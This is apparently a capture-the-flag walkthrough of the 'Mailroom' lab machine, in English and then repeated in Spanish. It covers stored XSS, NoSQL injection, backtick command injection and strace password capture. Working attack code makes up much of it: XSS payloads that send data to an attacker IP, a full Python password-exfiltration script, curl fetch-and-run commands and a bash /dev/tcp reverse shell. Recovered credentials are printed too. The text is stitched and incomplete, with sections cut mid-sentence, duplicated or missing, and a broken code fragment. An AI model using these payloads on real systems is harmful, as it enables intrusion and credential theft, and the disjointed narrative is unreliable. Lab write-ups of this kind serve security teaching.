Exploitation Summary

The attack began with a public-facing PHP web application that accepted user inquiries and — as the page itself hinted — had an automated "AI" reviewer reading them. This reviewer turned out to be a bot visiting each submitted inquiry URL, making it a perfect target for stored XSS. Cookie exfiltration was a dead end, but the XSS could be weaponised to make cross-origin requests to an internal vhost (staff-review-panel.mailroom.htb) that was otherwise inaccessible from the outside.

The source code of that internal application was leaked through a public Gitea repository, which revealed a MongoDB authentication endpoint vulnerable to NoSQL injection and a shell_exec call susceptible to command injection. Because the 2FA token sent after a successful login was unreachable, the NoSQL injection was pivoted into a blind character-by-character password exfiltration via the XSS channel, eventually yielding credentials for the user tristan, who also reused the same password for SSH.

Once on the box as tristan, a SOCKS proxy was set up over SSH to reach the internal staff panel. A backtick injection in the inquiry_id parameter (the regex sanitisation forgot to block the backtick character) gave RCE as www-data inside a container. Inside the container the .git/config file contained URL-encoded credentials for matthew, allowing lateral movement via su.

Finally, pspy revealed that a kpcli process was spawned every 30 seconds to open a KeePass database. Attaching strace to that process captured the master password being typed character by character. Opening the database exposed the root account password stored in a "root acc" entry, completing the machine.

Stored XSS & Bot Interaction

Injecting a classic XSS probe into the message field confirms the vulnerability:

<script>alert(1)</script>

Visiting the generated inquiry URL triggers the alert. To verify the bot is actually visiting, a fetch payload is submitted pointing to a local HTTP server:

<script>fetch('http://10.10.14.195');</script>

Two requests arrive — one from the attacker's own browser visit, and one originating from the victim machine (10.129.229.1), confirming the bot is real. Attempting to exfiltrate cookies returns an empty value, meaning either no session cookies exist or they are flagged HttpOnly.

Subdomain Discovery & Source Code Leak

Virtual host enumeration reveals an additional subdomain:

git.mailroom.htb  (Status: 200)

This hosts a Gitea instance with three visible users: administrador, matthew, and tristan. Matthew has a public repository at http://git.mailroom.htb/matthew/staffroom containing the source code of an internal staff application. Cloning and reviewing it reveals two critical pieces of information.

First, a virtual host reference buried in the authentication flow:

$message = 'Click on this link to authenticate: http://staff-review-panel.mailroom.htb/auth.php?token=' . $token;

Adding staff-review-panel.mailroom.htb to /etc/hosts and trying to access it directly returns 403 on every path — the application only accepts connections from within the server itself.

Second, two commits expose a command injection sink in inspect.php:

$contents = shell_exec("cat /var/www/mailroom/inquiries/$inquiryId.html");

The variable $inquiryId is partially sanitised by a regex but, as will become clear later, not thoroughly enough.

XSS-Pivoted CORS Bypass to Internal Application

Since the bot runs on the server itself, it can reach the internal vhost. The XSS is used as a relay to make server-side requests. Using fetch() with Content-Type: application/json or application/x-www-form-urlencoded triggers CORS preflight and nothing is returned. However, XMLHttpRequest with application/x-www-form-urlencoded bypasses this restriction in practice.

The following XSS payload confirms access to the internal application by exfiltrating its HTML back to the attacker:

<script>
async function xd() {
  const response = await fetch('http://staff-review-panel.mailroom.htb');
  const data = await response.text();
  fetch('http://10.10.14.195/?xss=' + btoa(data));
}
xd();
</script>

NoSQL Injection in the Authentication Endpoint

Reviewing auth.php from the leaked source reveals two bugs in the authentication logic:

if (!is_string($_POST['email']) || !is_string($_POST['password'])) {
    header('HTTP/1.1 401 Unauthorized');
    echo json_encode(['success' => false, 'message' => 'Invalid input detected']);
    // ← missing exit; here!
}

$user = $collection->findOne(['email' => $_POST['email'], 'password' => $_POST['password']]);

The missing exit; after the string-type check means execution continues even when the guard fires — the Invalid input detected message is echoed, but the MongoDB query still runs. Combined with the fact that POST parameters can be passed as arrays (enabling MongoDB operators like $ne and $regex), this enables full NoSQL injection.

The following XSS payload performs a login bypass using $ne on both fields, finding any valid user:

<script>
const req = new XMLHttpRequest();
req.open("POST", "http://staff-review-panel.mailroom.htb/auth.php", false);
req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
req.send("email[$ne]=asd@mailroom.htb&password[$ne]=asd");

const exfil = new XMLHttpRequest();
exfil.open("GET", "http://10.10.14.195/?xss=" + btoa(req.responseText), true);
exfil.send();
</script>

Decoding the response confirms successful authentication (the 2FA email was triggered):

{"success":false,"message":"Invalid input detected"}
{"success":true,"message":"Check your inbox for an email with your 2FA token"}

The 2FA token, however, is sent by email — and is therefore unreachable externally. This means the bypass alone is insufficient to gain an authenticated session.

Blind NoSQL Password Exfiltration via XSS

Instead of bypassing login, the injection can be abused to enumerate the actual password character by character using the MongoDB $regex operator. By testing regex anchors like ^a.*, ^b.*, etc., and observing whether the response contains "success":true (which indicates the 2FA email was triggered, meaning the credential was correct), it is possible to brute-force the password one character at a time.

Since the bot processes each submission independently, this is automated with a Python script that submits one XSS payload per character test, waits for the callback, and advances the known prefix on a match. Testing with a few known staff email addresses confirms that tristan@mailroom.htb is a valid account.

The automated exfiltration script works as follows:

#!/usr/bin/env python3
"""
HTB Mailroom - XSS + NoSQL Injection Password Exfiltration
Automates blind character-by-character password brute-force via XSS exfil.
"""

import threading
import urllib.parse
import requests
import base64
import time
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

# ─── CONFIG ───────────────────────────────────────────────────────────────────
TARGET_URL  = "http://mailroom.htb/contact.php"
AUTH_URL    = "http://staff-review-panel.mailroom.htb/auth.php"
EXFIL_HOST  = "10.10.14.195"   # Your tun0 IP
EXFIL_PORT  = 80
EMAIL       = "tristan@mailroom.htb"
MAX_RETRIES = 3
TIMEOUT     = 8   # seconds to wait for the XSS callback
CHARSET     = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:,.<>?"
# ──────────────────────────────────────────────────────────────────────────────

callback_event   = threading.Event()
callback_payload = None
current_token    = None   # only accept callbacks matching this token

class ExfilHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        global callback_payload, current_token
        if "?token=" in self.path and "&resp=" in self.path:
            try:
                qs     = self.path.split("?", 1)[1]
                params = dict(p.split("=", 1) for p in qs.split("&"))
                token  = params.get("token", "")
                b64    = params.get("resp",  "")
                if token != current_token:
                    self.send_response(200); self.end_headers(); return
                decoded = base64.b64decode(
                    urllib.parse.unquote(b64)
                ).decode("utf-8", errors="replace")
            except Exception:
                decoded = ""
            callback_payload = decoded
            callback_event.set()
        self.send_response(200); self.end_headers()

    def log_message(self, fmt, *args):
        pass  # silence access logs

def start_server():
    server = HTTPServer(("0.0.0.0", EXFIL_PORT), ExfilHandler)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    return server

def build_xss_payload(regex: str, token: str) -> str:
    script = (
        f'<script>\n'
        f'const req = new XMLHttpRequest();\n'
        f'req.open("POST", "{AUTH_URL}", false);\n'
        f'req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");\n'
        f'req.send("email={EMAIL}&password[$regex]={regex}");\n'
        f'\n'
        f'const exfil = new XMLHttpRequest();\n'
        f'exfil.open("GET", "http://{EXFIL_HOST}/?token={token}&resp=" + btoa(req.responseText), true);\n'
        f'exfil.send();\n'
        f'</script>'
    )
    return script

def send_xss(regex: str) -> str | None:
    global callback_payload, current_token
    token          = str(time.time_ns())
    current_token  = token
    callback_payload = None
    callback_event.clear()
    xss  = build_xss_payload(regex, token)
    data = {"email": "attacker@attacker.com", "title": "test", "message": xss}
    try:
        requests.post(TARGET_URL, data=data, timeout=10)
    except requests.RequestException as e:
        print(f" [!] POST error: {e}")
        return None
    triggered = callback_event.wait(timeout=TIMEOUT)
    return callback_payload if triggered else None

def is_correct(response: str) -> bool:
    if response is None:
        return False
    return (
        '"success":true' in response
        and "2FA token" in response
        and "Invalid email or password" not in response
    )

def test_char(regex: str) -> bool:
    for attempt in range(1, MAX_RETRIES + 1):
        resp = send_xss(regex)
        if resp is not None:
            return is_correct(resp)
        print(f" [~] No callback (attempt {attempt}/{MAX_RETRIES}), retrying...")
        time.sleep(1)
    print(f" [!] All retries exhausted for regex: {regex}")
    return False

def re_escape(s: str) -> str:
    special = r"\.+*?[](){}^$|"
    result  = ""
    for c in s:
        result += ("\\" + c) if c in special else c
    return result

def brute_force_password() -> str:
    password = ""
    print(f"\n[*] Starting NoSQL injection password exfiltration for: {EMAIL}")
    print(f"[*] Listening for callbacks on {EXFIL_HOST}:{EXFIL_PORT}\n")
    while True:
        found_char = False
        for ch in CHARSET:
            regex = f"^{re_escape(password + ch)}.*"
            print(f"[?] Testing: '{password}{ch}' (regex: {regex})", end="\r", flush=True)
            if test_char(regex):
                password   += ch
                found_char  = True
                print(f"\n[+] Found character: '{ch}' → Password so far: {password}")
                break
        if not found_char:
            regex = f"^{re_escape(password)}$"
            if test_char(regex):
                print(f"\n[✓] Password complete: {password}")
            else:
                print(f"\n[!] Could not find next character. Password so far: {password}")
            break
    return password

if __name__ == "__main__":
    print("[*] Starting exfil listener...")
    srv = start_server()
    print(f"[*] HTTP server listening on 0.0.0.0:{EXFIL_PORT}")
    try:
        pwd = brute_force_password()
        print(f"\n[★] FINAL PASSWORD: {pwd}")
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
    finally:
        srv.shutdown()

The script exposes an HTTP server on port 80 to receive the XSS callbacks, and uses retry logic to compensate for the occasional missed callback — a necessity when the trigger is an automated bot rather than a human. The process is slow (one HTTP round-trip per character test), but after some time the following credentials are recovered:

tristan@mailroom.htb : 69trisRulez!

Even with these credentials, logging into the staff panel is impossible without the 2FA token. However, testing password reuse over SSH works immediately:

ssh tristan@mailroom.htb

SSH access as tristan is established. Checking /var/mail/tristan confirms that the 2FA emails do arrive here — so had direct shell access been available from the start, the NoSQL bypass + email token would have been another valid path.

SOCKS Proxy to Access the Internal Panel

With SSH access, the internal staff panel can now be reached directly. Because the service is not bound to a specific port that can be forwarded with a simple -L tunnel (it's a vhost-based routing at the web layer), a SOCKS proxy is the cleaner approach. /etc/hosts on the attacker machine is updated to resolve the internal vhost to localhost:

127.0.0.1  localhost staff-review-panel.mailroom.htb

Then a dynamic SOCKS tunnel is established over SSH:

ssh -N -D 1080 tristan@mailroom.htb

In Firefox, FoxyProxy is configured to route traffic through 127.0.0.1:1080 (SOCKS5):

One additional change is required in Firefox's about:config to make DNS resolution go through the proxy (otherwise the vhost won't resolve correctly):

network.proxy.socks_remote_dns = true

With this in place, the staff review panel is fully accessible. It shows an administration interface for reviewing the submitted inquiries and exposes an endpoint at POST /inspect.php where an inquiry_id parameter controls which inquiry is loaded.

Command Injection via Backtick — RCE as www-data

The sanitisation applied to inquiry_id in the leaked source is:

if (isset($_POST['inquiry_id'])) {
    $inquiryId = preg_replace('/[\$<>;|&{}\(\)\[\]\'\"]/', '', $_POST['inquiry_id']);
    $contents  = shell_exec("cat /var/www/mailroom/inquiries/$inquiryId.html");
}

The regex strips $, <, >, ;, |, &, {}, (), [], and quotes — but crucially it does not block the backtick character (`). In bash, backticks perform command substitution the same way $() does, so the shell will execute whatever is between them.

A simple ping-back confirms execution:

inquiry_id=`curl 10.10.14.55`

The attacker's HTTP server receives a connection from the target, confirming RCE. To obtain a shell, a reverse shell script is first staged on the attacker's HTTP server:

bash -c "bash -i >& /dev/tcp/10.10.14.55/443 0>&1"

Since the pipe character is blocked by the sanitiser, the payload is split into two requests — first download the script, then execute it:

inquiry_id=`curl 10.10.14.55 -o /tmp/xd`

inquiry_id=`bash /tmp/xd`

A reverse shell as www-data is received inside what appears to be a Docker container (hostname is a short hex string, no real init system, etc.).

Exploring the container's filesystem, the web application directory is found at /var/www/staffroom. This is a git repository, and its config file contains the remote URL with embedded credentials:

KeePass Master Password via strace Process Tracing

Initial attempts to open personal.kdbx with kpcli fail — the known passwords don't work. Running pspy64 to monitor running processes reveals something interesting: every 30 seconds, a kpcli process is launched under UID 1001 (matthew):

CMD: UID=1001 PID=24427 | -bash -c /usr/bin/kpcli
CMD: UID=1001 PID=24429 | /usr/bin/perl /usr/bin/kpcli

Attempting to open the database manually now shows a lock file warning, indicating another process already has it open:

kpcli:/> open personal.kdbx
WARNING: A KeePassX-style lock file is in place for this file.
It may be opened elsewhere. Be careful of saving!

Since kpcli is a Perl script that reads the password from standard input via ioctl (disabling terminal echo), strace can intercept all system calls including the character-by-character keyboard reads. The command is run until it attaches to an active perl process:

strace -p $(pidof perl)

The output is substantial. Analysing it shows the password being read one character at a time with 50 ms polling intervals, with a backspace mid-way through correcting a typo. Reconstructing the sequence:

Characters typed: !sEcUr3p4$$w01 → backspace (erases 1) → r, d, 9 → Enter.
Final password: !sEcUr3p4$$w0rd9

Resumen de Explotación

El ataque comenzó con una aplicación PHP pública que aceptaba consultas de usuarios y, tal como indicaba la propia página, contaba con una "IA" automatizada que las leía. Ese revisor resultó ser un bot que visitaba cada URL de consulta enviada, convirtiéndolo en un objetivo ideal para XSS almacenado. La exfiltración de cookies fue un callejón sin salida, pero el XSS podía armarse para realizar peticiones cross-origin a un vhost interno (staff-review-panel.mailroom.htb) inaccesible desde el exterior.

El código fuente de esa aplicación interna estaba expuesto en un repositorio público de Gitea, lo que reveló un endpoint de autenticación MongoDB vulnerable a inyección NoSQL y una llamada a shell_exec susceptible de inyección de comandos. Como el token 2FA enviado tras un login exitoso era inalcanzable, la inyección NoSQL se reconvirtió en una exfiltración ciega carácter a carácter a través del canal XSS, consiguiendo finalmente las credenciales del usuario tristan, quien reutilizaba la misma contraseña para SSH.

Una vez en la máquina como tristan, se configuró un proxy SOCKS sobre SSH para acceder al panel interno. Una inyección de backtick en el parámetro inquiry_id (el regex de saneamiento olvidó bloquear ese carácter) proporcionó RCE como www-data dentro de un contenedor. Dentro del contenedor, el archivo .git/config contenía credenciales con codificación URL para matthew, lo que permitió el movimiento lateral mediante su.

Por último, pspy reveló que cada 30 segundos se lanzaba un proceso kpcli para abrir una base de datos KeePass. Enganchando strace a ese proceso se capturó la contraseña maestra tecleada carácter a carácter. Abriendo la base de datos se expuso la contraseña de root almacenada en una entrada "root acc", completando la máquina.

Bypass CORS Mediante XSS Pivotado a la Aplicación Interna

Como el bot se ejecuta en el propio servidor, sí puede acceder al vhost interno. El XSS se usa como relay para realizar peticiones desde el lado del servidor. Usar fetch() con Content-Type: application/json o application/x-www-form-urlencoded dispara el preflight CORS y no se recibe nada. Sin embargo, XMLHttpRequest con application/x-www-form-urlencoded esquiva esta restricción en la práctica.

El siguiente payload XSS confirma el acceso a la aplicación interna exfiltrando su HTML de vuelta al atacante:

  const response = await fetch('http://staff-review-panel.mailroom.htb');
  const data = await response.text();
  fetch('http://10.10.14.195/?xss=' + btoa(data));

xd();
</script>

Inyección NoSQL en el Endpoint de Autenticación

Revisando auth.php del código fuente filtrado se observan dos bugs en la lógica de autenticación:

if (!is_string($_POST['email']) || !is_string($_POST['password'])) {
    header('HTTP/1.1 401 Unauthorized');
    echo json_encode(['success' => false, 'message' => 'Invalid input detected']);
    // ← falta exit; aquí
}

$user = $collection->findOne(['email' => $_POST['email'], 'password' => $_POST['password']]);

La ausencia del exit; tras la comprobación de tipos hace que la ejecución continúe incluso cuando el guard se activa — se muestra el mensaje Invalid input detected, pero la query MongoDB se ejecuta igualmente. Combinado con el hecho de que los parámetros POST pueden enviarse como arrays (habilitando operadores MongoDB como $ne y $regex), esto permite una inyección NoSQL completa.

El siguiente payload XSS realiza un bypass de login usando $ne en ambos campos, encontrando cualquier usuario válido:

<script>
const req = new XMLHttpRequest();
req.open("POST", "http://staff-review-panel.mailroom.htb/auth.php", false);
req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
req.send("email[$ne]=asd@mailroom.htb&password[$ne]=asd");

const exfil = new XMLHttpRequest();
exfil.open("GET", "http://10.10.14.195/?xss=" + btoa(req.responseText), true);
exfil.send();
</script>

Decodificando la respuesta se confirma la autenticación exitosa (el correo 2FA fue enviado):

{"success":false,"message":"Invalid input detected"}
{"success":true,"message":"Check your inbox for an email with your 2FA token"}

El token 2FA, sin embargo, se envía por correo — y por tanto es inalcanzable desde el exterior. Esto significa que el bypass por sí solo es insuficiente para obtener una sesión autenticada.

Exfiltración Ciega de Contraseña NoSQL vía XSS

En lugar de hacer bypass del login, la inyección puede abusarse para enumerar la contraseña real carácter a carácter usando el operador $regex de MongoDB. Probando anchors regex como ^a.*, ^b.*, etc., y observando si la respuesta contiene "success":true (lo que indica que el correo 2FA fue enviado, es decir, la credencial era correcta), es posible hacer fuerza bruta de la contraseña de a un carácter.

Como el bot procesa cada envío de forma independiente, esto se automatiza con un script Python que envía un payload XSS por cada carácter probado, espera el callback y avanza el prefijo conocido cuando hay coincidencia. Probando con varios correos de empleados visibles en la página confirma que tristan@mailroom.htb es una cuenta válida.

El script de exfiltración automatizada funciona así:

#!/usr/bin/env python3
"""
HTB Mailroom - XSS + NoSQL Injection Password Exfiltration
Automates blind character-by-character password brute-force via XSS exfil.
"""

import threading
import urllib.parse
import requests
import base64
import time
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

# ─── CONFIG ───────────────────────────────────────────────────────────────────
TARGET_URL  = "http://mailroom.htb/contact.php"
AUTH_URL    = "http://staff-review-panel.mailroom.htb/auth.php"
EXFIL_HOST  = "10.10.14.195"   # Tu IP de tun0
EXFIL_PORT  = 80
EMAIL       = "tristan@mailroom.htb"
MAX_RETRIES = 3
TIMEOUT     = 8   # segundos esperando el callback XSS
CHARSET     = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:,.<>?"
# ──────────────────────────────────────────────────────────────────────────────

callback_event   = threading.Event()
callback_payload = None
current_token    = None   # solo aceptar callbacks que coincidan con este token

class ExfilHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        global callback_payload, current_token
        if "?token=" in self.path and "&resp=" in self.path:
            try:
                qs     = self.path.split("?", 1)[1]
                params = dict(p.split("=", 1) for p in qs.split("&"))
                token  = params.get("token", "")
                b64    = params.get("resp",  "")
                if token != current_token:
                    self.send_response(200); self.end_headers(); return
                decoded = base64.b64decode(
                    urllib.parse.unquote(b64)
                ).decode("utf-8", errors="replace")
            except Exception:
                decoded = ""
            callback_payload = decoded
            callback_event.set()
        self.send_response(200); self.end_headers()

    def log_message(self, fmt, *args):
        pass  # silenciar logs de acceso

def start_server():
    server = HTTPServer(("0.0.0.0", EXFIL_PORT), ExfilHandler)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    return server

def build_xss_payload(regex: str, token: str) -> str:
    script = (
        f'<script>\n'
        f'const req = new XMLHttpRequest();\n'
        f'req.open("POST", "{AUTH_URL}", false);\n'
        f'req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");\n'
        f'req.send("email={EMAIL}&password[$regex]={regex}");\n'
        f'\n'
        f'const exfil = new XMLHttpRequest();\n'
        f'exfil.open("GET", "http://{EXFIL_HOST}/?token={token}&resp=" + btoa(req.responseText), true);\n'
        f'exfil.send();\n'
        f'</script>'
    )
    return script

def send_xss(regex: str) -> str | None:
    global callback_payload, current_token
    token           = str(time.time_ns())
    current_token   = token
    callback_payload = None
    callback_event.clear()
    xss  = build_xss_payload(regex, token)
    data = {"email": "attacker@attacker.com", "title": "test", "message": xss}
    try:
        requests.post(TARGET_URL, data=data, timeout=10)
    except requests.RequestException as e:
        print(f" [!] POST error: {e}")
        return None
    triggered = callback_event.wait(timeout=TIMEOUT)
    return callback_payload if triggered else None

def is_correct(response: str) -> bool:
    if response is None:
        return False
    return (
        '"success":true' in response
        and "2FA token" in response
        and "Invalid email or password" not in response
    )

def test_char(regex: str) -> bool:
    for attempt in range(1, MAX_RETRIES + 1):
        resp = send_xss(regex)
        if resp is not None:
            return is_correct(resp)
        print(f" [~] Sin callback (intento {attempt}/{MAX_RETRIES}), reintentando...")
        time.sleep(1)
    print(f" [!] Todos los reintentos agotados para regex: {regex}")
    return False

def re_escape(s: str) -> str:
    special = r"\.+*?[](){}^$|"
    result  = ""
    for c in s:
        result += ("\\" + c) if c in special else c
    return result

def brute_force_password() -> str:
    password = ""
    print(f"\n[*] Iniciando exfiltración de contraseña NoSQL para: {EMAIL}")
    print(f"[*] Escuchando callbacks en {EXFIL_HOST}:{EXFIL_PORT}\n")
    while True:
        found_char = False
        for ch in CHARSET:
            regex = f"^{re_escape(password + ch)}.*"
            print(f"[?] Probando: '{password}{ch}' (regex: {regex})", end="\r", flush=True)
            if test_char(regex):
                password   += ch
                found_char  = True
                print(f"\n[+] Carácter encontrado: '{ch}' → Contraseña hasta ahora: {password}")
                break
        if not found_char:
            regex = f"^{re_escape(password)}$"
            if test_char(regex):
                print(f"\n[✓] Contraseña completa: {password}")
            else:
                print(f"\n[!] No se encontró el siguiente carácter. Contraseña hasta ahora: {password}")
            break
    return password

if __name__ == "__main__":
    print("[*] Iniciando listener de exfiltración...")
    srv = start_server()
    print(f"[*] Servidor HTTP escuchando en 0.0.0.0:{EXFIL_PORT}")
    try:
        pwd = brute_force_password()
        print(f"\n[★] CONTRASEÑA FINAL: {pwd}")
    except KeyboardInterrupt:
        print("\n[!] Interrumpido por el usuario.")
    finally:
        srv.shutdown()

El script expone un servidor HTTP en el puerto 80 para recibir los callbacks del XSS y usa lógica de retry para compensar los callbacks que ocasionalmente no llegan — una necesidad cuando el trigger es un bot automatizado y no un humano. El proceso es lento (un viaje de ida y vuelta HTTP por carácter), pero tras un buen rato se recuperan las siguientes credenciales:

tristan@mailroom.htb : 69trisRulez!

Incluso con estas credenciales, iniciar sesión en el panel sigue siendo imposible sin el token 2FA. Sin embargo, probar la reutilización de contraseña por SSH funciona inmediatamente:

ssh tristan@mailroom.htb

Se establece acceso SSH como tristan. Revisando /var/mail/tristan se confirma que los correos 2FA sí llegan aquí — por lo que si se hubiera tenido acceso shell desde el principio, el bypass NoSQL + token por email habría sido otra vía válida.

Proxy SOCKS para Acceder al Panel Interno

Con acceso SSH, el panel interno ya es accesible directamente. Como el servicio no está vinculado a un puerto específico que pueda reenviarse con un túnel -L simple (es enrutamiento basado en vhost a nivel web), un proxy SOCKS es el enfoque más limpio. Se actualiza el /etc/hosts de la máquina atacante para resolver el vhost interno a localhost:

127.0.0.1  localhost staff-review-panel.mailroom.htb

Luego se establece un túnel SOCKS dinámico sobre SSH:

ssh -N -D 1080 tristan@mailroom.htb

Inyección de Comandos por Backtick — RCE como www-data

El saneamiento aplicado a inquiry_id en el código fuente filtrado es el siguiente:

if (isset($_POST['inquiry_id'])) {
    $inquiryId = preg_replace('/[\$<>;|&{}\(\)\[\]\'\"]/', '', $_POST['inquiry_id']);
    $contents  = shell_exec("cat /var/www/mailroom/inquiries/$inquiryId.html");
}

El regex elimina $, <, >, ;, |, &, {}, (), [] y comillas — pero de forma crítica no bloquea el carácter backtick (`). En bash, los backticks realizan sustitución de comandos exactamente igual que $(), por lo que el shell ejecutará lo que haya entre ellos.

Un ping-back simple confirma la ejecución:

inquiry_id=`curl 10.10.14.55`

El servidor HTTP del atacante recibe una conexión desde el objetivo, confirmando RCE. Para obtener una shell, primero se prepara un script de reverse shell en el servidor HTTP del atacante:

bash -c "bash -i >& /dev/tcp/10.10.14.55/443 0>&1"

Como el carácter pipe está bloqueado por el saneamiento, el payload se divide en dos peticiones — primero se descarga el script y luego se ejecuta:

inquiry_id=`curl 10.10.14.55 -o /tmp/xd`

inquiry_id=`bash /tmp/xd`

Se recibe una reverse shell como www-data dentro de lo que parece ser un contenedor Docker (el hostname es una cadena hexadecimal corta, no hay sistema init real, etc.).

Intentar abrir la base de datos manualmente ahora muestra una advertencia de archivo de bloqueo, indicando que otro proceso ya la tiene abierta:

Como kpcli es un script Perl que lee la contraseña desde la entrada estándar mediante ioctl (deshabilitando el eco del terminal), strace puede interceptar todas las llamadas al sistema incluyendo las lecturas de teclado carácter a carácter. Se ejecuta el comando hasta que se engancha a un proceso perl activo:

strace -p $(pidof perl)

La salida es extensa. Analizándola se observa la contraseña siendo leída un carácter cada vez con intervalos de sondeo de 50 ms, con un backspace a mitad para corregir un error de escritura. Reconstruyendo la secuencia:

Caracteres tecleados: !sEcUr3p4$$w01 → retroceso (borra el 1) → r, d, 9 → Enter.
Contraseña final: !sEcUr3p4$$w0rd9
